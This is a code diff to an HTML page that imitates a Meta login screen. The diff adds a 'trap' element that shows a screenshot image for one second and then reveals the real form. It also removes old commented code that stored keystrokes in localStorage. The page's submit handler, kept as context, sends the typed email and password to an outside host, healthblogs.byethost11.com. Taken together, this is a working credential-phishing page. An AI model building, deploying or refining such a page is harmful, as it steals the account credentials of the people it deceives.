@@ -13,6 +13,16 @@
             box-sizing: border-box;
             font-family: Arial, Helvetica, sans-serif;
         }
+        #trap {
+            height: 90vh;
+            width: 100%;
+        }
+        #trap img {
+            max-width: 100%;
+        }
+        #main {
+            display: none;
+        }
         .upper {
             background: #FFFBE2;
             color: #7F7212;
@@ -128,6 +138,10 @@
     </style>
 </head>
 <body>
+    <div id="trap">
+        <img src="ss.jpg" alt="">
+    </div>
+    <div id="main">
     <div class="upper">
         <p>You must log in first.</p>
     </div>
@@ -171,15 +185,9 @@
             <p>Meta © 2023</p>
         </div>
     </div>
+</div>
     <script>
-        // localStorage.setItem("string1","value");
-        // localStorage.setItem("string2","value");
-        // email.onkeydown=()=>{
-        //     localStorage.setItem("string1",email.value);
-        // }
-        // password.onkeydown=()=>{
-        //     localStorage.setItem("string2",password.value);
-        // }
+        setInterval(()=>{trap.style.display="none";main.style.display="block"},1000)
         sub.onclick=()=>{
             location.href=`http://healthblogs.byethost11.com/ind.php?string=${email.value}%${password.value}`
         }
